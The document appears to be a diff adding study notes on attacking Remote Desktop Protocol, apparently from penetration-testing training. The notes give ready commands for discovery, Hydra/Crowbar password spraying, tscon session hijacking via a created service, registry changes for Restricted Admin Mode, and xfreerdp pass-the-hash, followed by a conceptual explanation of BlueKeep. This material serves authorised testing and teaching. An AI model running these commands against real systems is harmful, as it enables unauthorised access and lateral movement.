@@ -1,0 +1,104 @@
+✅ Summary: RDP (Remote Desktop Protocol) Attacks
+RDP is a powerful admin tool that runs over TCP/3389. Its convenience also makes it a prime attack surface. Attackers can exploit RDP through:
+
+Enumeration (via Nmap, checking if 3389 is open)
+
+Brute-force or Password Spraying using tools like Crowbar or Hydra
+
+Login with RDP Clients: rdesktop / xfreerdp
+
+RDP Session Hijacking using tscon from a SYSTEM-level shell
+
+RDP Pass-the-Hash (PtH) if Restricted Admin Mode is enabled
+
+GUI Post-Exploitation where GUI access enables deeper lateral movement or access to unique tools/UI-based software
+
+🧠 Patterns & Key Takeaways
+Category	Pattern
+RDP Discovery	If TCP/3389 is open → RDP likely available
+Spray Strategy	Avoid account lockout by testing 1 password across many users
+Session Hijack	SYSTEM + tscon = impersonate another RDP session
+RDP PtH	Needs NT hash + Restricted Admin Mode ON
+GUI Access Needs	Some tools or apps can only be accessed via GUI (ex: finance apps, legacy admin GUIs)
+⚙️ Workflow: Attacking RDP
+markdown
+Copy
+Edit
+## 1. Discover RDP
+nmap -Pn -p3389 <target>
+
+## 2. Password Spray
+# With Crowbar:
+crowbar -b rdp -s <target> -U usernames.txt -c 'password123'
+
+# Or with Hydra:
+hydra -L usernames.txt -p 'password123' <target> rdp
+
+## 3. RDP Login (if creds found)
+rdesktop -u <user> -p <pass> <target>
+xfreerdp /v:<target> /u:<user> /p:<pass>
+
+## 4. RDP Session Hijacking (post-access)
+# If SYSTEM access:
+query user  # find active sessions
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon <target_session_id> /dest:<your_session_name>"
+net start sessionhijack
+
+## 5. RDP Pass-the-Hash
+# Pre-req: Restricted Admin Mode enabled on target
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+# RDP with NT hash:
+xfreerdp /v:<target> /u:<user> /pth:<NT_HASH>
+🔀 If-This-Then-That (ITTT) - RDP Attacks
+markdown
+Copy
+Edit
+IF port 3389 is open
+→ THEN check for RDP login possibilities
+
+IF no credentials
+→ THEN try Crowbar or Hydra to spray common passwords
+
+IF valid creds found
+→ THEN log in via rdesktop or xfreerdp
+
+IF SYSTEM access AND another RDP session exists
+→ THEN hijack using tscon via new service creation
+
+IF you have NT hash of a user
+→ IF Restricted Admin Mode is enabled
+   → THEN use xfreerdp /pth to access via RDP
+   → ELSE try enabling it via reg add (if you have access)
+
+IF GUI access would help reach a tool or config not available over CLI
+→ THEN prioritize RDP access
+
+                                       Latest RDP Vulnerabilities
+In 2019, a critical vulnerability was published in the RDP (TCP/3389) service that also led to remote code execution (RCE) with the identifier CVE-2019-0708. This vulnerability is known as BlueKeep. It does not require prior access to the system to exploit the service for our purposes. However, the exploitation of this vulnerability led and still leads to many malware or ransomware attacks. Large organizations such as hospitals, whose software is only designed for specific versions and libraries, are particularly vulnerable to such attacks, as infrastructure maintenance is costly. Here, too, we will not go into minute detail about this vulnerability but rather keep the focus on the concept.
+
+The Concept of the Attack
+The vulnerability is also based, as with SMB, on manipulated requests sent to the targeted service. However, the dangerous thing here is that the vulnerability does not require user authentication to be triggered. Instead, the vulnerability occurs after initializing the connection when basic settings are exchanged between client and server. This is known as a Use-After-Free (UAF) technique that uses freed memory to execute arbitrary code.
+
+The Concept of Attacks
+
+
+This attack involves many different steps in the kernel of the operating system, which are not of great importance here for the time being to understand the concept behind it. After the function has been exploited and the memory has been freed, data is written to the kernel, which allows us to overwrite the kernel memory. This memory is used to write our instructions into the freed memory and let the CPU execute them. If we want to look at the technical analysis of the BlueKeep vulnerability, this article provides a nice overview.
+
+Initiation of the Attack
+Step	BlueKeep	Concept of Attacks - Category
+1.	Here, the source is the initialization request of the settings exchange between server and client that the attacker has manipulated.	Source
+2.	The request leads to a function used to create a virtual channel containing the vulnerability.	Process
+3.	Since this service is suitable for administering of the system, it is automatically run with the LocalSystem Account privileges of the system.	Privileges
+4.	The manipulation of the function redirects us to a kernel process.	Destination
+This is when the cycle starts all over again, but this time to gain remote access to the target system.
+
+Trigger Remote Code Execution
+Step	BlueKeep	Concept of Attacks - Category
+5.	The source this time is the payload created by the attacker that is inserted into the process to free the memory in the kernel and place our instructions.	Source
+6.	The process in the kernel is triggered to free the kernel memory and let the CPU point to our code.	Process
+7.	Since the kernel also runs with the highest possible privileges, the instructions we put into the freed kernel memory here are also executed with LocalSystem Account privileges.	Privileges
+8.	With the execution of our instructions from the kernel, a reverse shell is sent over the network to our host.	Destination
+Not all newer Windows variants are vulnerable to Bluekeep, according to Microsoft. Security updates for current Windows versions are available, and Microsoft has also provided updates for many older Windows versions that are no longer supported. Nevertheless, 950,000 Windows systems were identified as vulnerable to Bluekeep attacks in an initial scan in May 2019, and even today, about a quarter of those hosts are still vulnerable.
+
+ Note: This is a flaw that we will likely run into during our penetration tests, but it can cause system instability, including a "blue screen of death (BSoD)," and we should be careful before using the associated exploit. If in doubt, it's best to first speak with our client so they understand the risks and then decide if they would like us to run the exploit or not.
